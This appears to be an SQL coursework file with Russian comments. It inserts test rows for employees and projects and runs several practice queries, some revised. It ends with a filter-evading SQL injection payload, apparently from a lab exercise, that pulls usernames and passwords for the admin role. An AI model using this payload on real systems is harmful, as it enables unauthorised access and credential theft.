------------------------------------------------------------------------TEST VALUES
-- работник / должность / отделение / проекты, которыми руководят
insert into employees values
('employee1', 'exec1', 'main', NULL),
('employee2', 'exec2', 'not main', NULL),
('employee3', 'exec3', 'not main', 1);


-- код проекта / название проекта / задача / исполнитель / часы / дата плановая / дата реальная / отметка о принятии / описание задачи
insert into projects values
('1', 'first', 'task1', 'employee1', 8, '17.11.2022', '19.12.2022', false, 'task_description'),
('1', 'first', 'task2', 'employee2', 8, '17.11.2022', '17.11.2022', false,'task_description'),
('1', 'first', 'task3', 'employee2', 8, '17.11.2022', '17.11.2022',false, 'task_description'),
('1', 'first', 'task4', 'employee1', 8, '17.11.2022', '19.11.2022',false, 'task_description'),
('2', 'second', 'task1', 'employee2', 8, '17.11.2022', '17.12.2022',false, 'task_description'),
('2', 'second', 'task3', 'employee1', 8, '17.11.2022', '20.11.2022',false, 'task_description'),
('2', 'second', 'task4', 'employee1', 8, '17.11.2022', '20.11.2022',false, 'task_description'),
('2', 'second', 'task2', 'employee3', 8, '17.11.2022', '17.12.2022',true, 'task_description'),
('3', 'third', 'task1', 'employee1', 8, '17.11.2022', '17.12.2022',true, 'task_description'),
('3', 'third', 'task2', 'employee2', 8, '17.11.2022', '17.12.2022',true, 'task_description');


------------------------------------------------------------------------ЗАПРОСЫ
--запрос 1
SELECT (project_code, project_name)
    FROM Projects
    WHERE done is false
    GROUP BY project_name, project_code
    HAVING COUNT(Projects.project_name) > 3;

--запрос 2
SELECT (task_name, executor_name)
    FROM Projects
    WHERE real_date  not BETWEEN '16.11.2022' AND '18.11.2022';

--запрос 3
SELECT a.executor_name
    FROM Projects a, Projects b
    GROUP BY a.executor_name
    HAVING COUNT (DISTINCT a.project_code) = COUNT (DISTINCT b.project_code)

union

SELECT DISTINCT executor_name
FROM Projects as val1
WHERE exists (
	SELECT project_code 
 	FROM Projects 
 	WHERE Projects.executor_name = val1.executor_name
	EXCEPT
		SELECT project_code 
 		FROM Projects 
 		WHERE Projects.executor_name = val1.executor_name AND done is false 
 		GROUP BY project_code);

--переделываем запорс 3
SELECT full_name_employee FROM Employees AS T1
    WHERE NOT EXISTS (
        SELECT project_code from Projects AS T2
            WHERE T2.executor_name <> T1.full_name_employee
    );


SELECT * 
    FROM Employees T1
	WHERE NOT EXISTS(
		SELECT * 
        FROM (SELECT project_code, project_name 
                FROM projects 
                GROUP BY project_code, project_name) AS T2
		WHERE NOT EXISTS(
			SELECT * 
            FROM (SELECT * 
                FROM projects T3 
                WHERE T3.executor_name = T1.full_name_employee) as T4
			WHERE T4.project_code = T2.project_code))

	or NOT EXISTS(

		SELECT * 
        FROM (SELECT project_name, task_name 
                FROM projects 
                WHERE (done=true) 
                GROUP BY project_name, task_name) AS T5
		WHERE NOT EXISTS(
			SELECT * 
            FROM (SELECT * 
                    FROM projects T3 
                    WHERE T3.executor_name = T1.full_name_employee) as T6
			WHERE T6.task_name = T5.task_name));


SELECT full_name_employee
    FROM Employees
    AS t1
    WHERE NOT EXISTS (
        SELECT project_code
        FROM Projects
        WHERE NOT EXISTS (
            SELECT executor_name
            FROM Projects
            AS T3
            WHERE T3.executor_name = T1.full_name_employee
        )
    );

--sql injection
select * from GetUserInfo('/* */''; 
seselectlect/* */t1.username,/* */t1.balance,/* */t2.password,/* */t1.visible,/* */t1.YzNaYONpzT
frfromom/* */users_sTtFVc/* */as/* */t1
	join/* */passwords_sTtFVc/* */as/* */t2
on/* */t1.username/* */not/* */<>/* */t2.username 
	join/* */roles_sTtFVc/* */as/* */t3 
on/* */CONVERT(VARCHAR(5),0x4d4435,0)(t2.username)/* */not/* */<>/* */t3.mHash 
     where/* */t3.role/* */not/* */<>/* */''0x61646d696e''--');